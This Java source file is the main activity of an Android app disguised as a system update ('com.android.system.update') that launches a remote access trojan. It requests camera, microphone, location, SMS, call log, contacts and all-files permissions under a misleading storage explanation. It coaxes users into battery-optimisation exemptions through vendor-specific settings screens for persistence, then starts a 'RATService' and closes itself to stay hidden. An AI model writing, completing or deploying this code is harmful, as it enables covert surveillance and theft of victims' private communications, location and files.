package com.android.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int BATTERY_OPTIMIZATION_REQUEST_CODE = 200;
    private static final int MANAGE_STORAGE_REQUEST_CODE = 300;
    
    // List of all permissions your app needs
    private final String[] requiredPermissions = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.SCHEDULE_EXACT_ALARM,
        Manifest.permission.USE_EXACT_ALARM,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        
        // Check and request permissions
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        // First, check if we need MANAGE_EXTERNAL_STORAGE for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                requestManageStoragePermission();
                return; // Wait for the result before checking other permissions
            }
        }
        
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            // Request all missing permissions at once
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // All permissions already granted
            allPermissionsGranted();
        }
    }
    
    private void requestManageStoragePermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                // Show explanation dialog first
                new AlertDialog.Builder(this)
                    .setTitle("Storage Permission Required")
                    .setMessage("This app needs access to all files to browse folders like " +
                               "Download, Documents, and custom folders. Please grant 'All files access' " +
                               "in the next screen.")
                    .setPositiveButton("Grant Access", (dialog, which) -> {
                        try {
                            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        } catch (Exception e) {
                            // Fallback for devices where the above intent doesn't work
                            Intent intent = new Intent();
                            intent.setAction(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                            startActivityForResult(intent, MANAGE_STORAGE_REQUEST_CODE);
                        }
                    })
                    .setNegativeButton("Skip", (dialog, which) -> {
                        // Continue with other permissions
                        checkAndRequestPermissions();
                    })
                    .show();
            } catch (Exception e) {
                e.printStackTrace();
                // If dialog fails, continue with other permissions
                checkAndRequestPermissions();
            }
        } else {
            // For Android 10 and below, continue with regular permissions
            checkAndRequestPermissions();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            StringBuilder deniedPermissions = new StringBuilder();
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    deniedPermissions.append(permissions[i]).append("\n");
                }
            }
            
            if (allGranted) {
                allPermissionsGranted();
            } else {
                // Some permissions denied, show warning but still try to start service
                Toast.makeText(this, 
                    "Some permissions denied. Some features may not work.\n" + deniedPermissions.toString(), 
                    Toast.LENGTH_LONG).show();
                
                // Check if we need to request MANAGE_EXTERNAL_STORAGE again
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (!Environment.isExternalStorageManager()) {
                        requestManageStoragePermission();
                        return;
                    }
                }
                
                allPermissionsGranted(); // Still try to start service with whatever permissions we have
            }
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == BATTERY_OPTIMIZATION_REQUEST_CODE) {
            // Check if user granted battery optimization exemption
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                String packageName = getPackageName();
                
                if (pm.isIgnoringBatteryOptimizations(packageName)) {
                    Toast.makeText(this, "Battery optimization disabled. App will run more reliably.", 
                        Toast.LENGTH_LONG).show();
                }
            }
        } else if (requestCode == MANAGE_STORAGE_REQUEST_CODE) {
            // Check if user granted MANAGE_EXTERNAL_STORAGE permission
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                if (Environment.isExternalStorageManager()) {
                    Toast.makeText(this, "All files access granted!", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "All files access not granted. Some folders may not be accessible.", 
                        Toast.LENGTH_LONG).show();
                }
            }
            // Continue with regular permissions
            checkAndRequestPermissions();
        }
    }
    
    private void allPermissionsGranted() {
        // All permissions granted, start service
        startRATService();
        
        // Check and request battery optimization exemption
        checkBatteryOptimization();
        
        // Open battery settings to help user whitelist the app
        openBatteryOptimizationSettings();
    }
    
    private void checkBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            String packageName = getPackageName();
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                // Show a dialog explaining why user should disable battery optimization
                new AlertDialog.Builder(this)
                    .setTitle("Battery Optimization")
                    .setMessage("For the app to work properly in the background, please disable battery optimization. " +
                               "This ensures the service continues running even when the device is idle.")
                    .setPositiveButton("Disable", (dialog, which) -> {
                        requestIgnoreBatteryOptimizations();
                    })
                    .setNegativeButton("Later", null)
                    .show();
            }
        }
    }
    
    private void requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent();
            String packageName = getPackageName();
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + packageName));
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST_CODE);
            }
        }
    }
    
    private void openBatteryOptimizationSettings() {
        // Wait a bit before opening battery settings (so user sees the app first)
        try {
            Thread.sleep(1000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        
        // Try manufacturer-specific battery settings first
        if (!openManufacturerBatterySettings()) {
            // Fallback to generic battery optimization settings
            try {
                Intent intent = new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS);
                startActivity(intent);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    private boolean openManufacturerBatterySettings() {
        // Xiaomi
        try {
            Intent intent = new Intent();
            intent.setClassName("com.miui.securitycenter", 
                "com.miui.powercenter.PowerSettingsActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Xiaomi
        }
        
        // Huawei
        try {
            Intent intent = new Intent();
            intent.setClassName("com.huawei.systemmanager", 
                "com.huawei.systemmanager.optimize.process.optimize.process.ProtectActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Huawei
        }
        
        // OPPO
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oppo.oppopowermonitor", 
                "com.oppo.oppopowermonitor.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OPPO
        }
        
        // Vivo
        try {
            Intent intent = new Intent();
            intent.setClassName("com.vivo.abe", 
                "com.vivo.abe.MainActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Vivo
        }
        
        // Samsung
        try {
            Intent intent = new Intent();
            intent.setClassName("com.samsung.android.lool", 
                "com.samsung.android.sm.ui.battery.BatteryActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not Samsung
        }
        
        // OnePlus
        try {
            Intent intent = new Intent();
            intent.setClassName("com.oneplus.security", 
                "com.oneplus.security.chainlaunch.ChainLaunchConfigActivity");
            startActivity(intent);
            return true;
        } catch (Exception e) {
            // Not OnePlus
        }
        
        return false; // No manufacturer settings found
    }
    
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Optional: Show a message
        Toast.makeText(this, "RAT Service Started", Toast.LENGTH_SHORT).show();
        
        // Close activity immediately (so it's hidden)
        finish();
    }
}
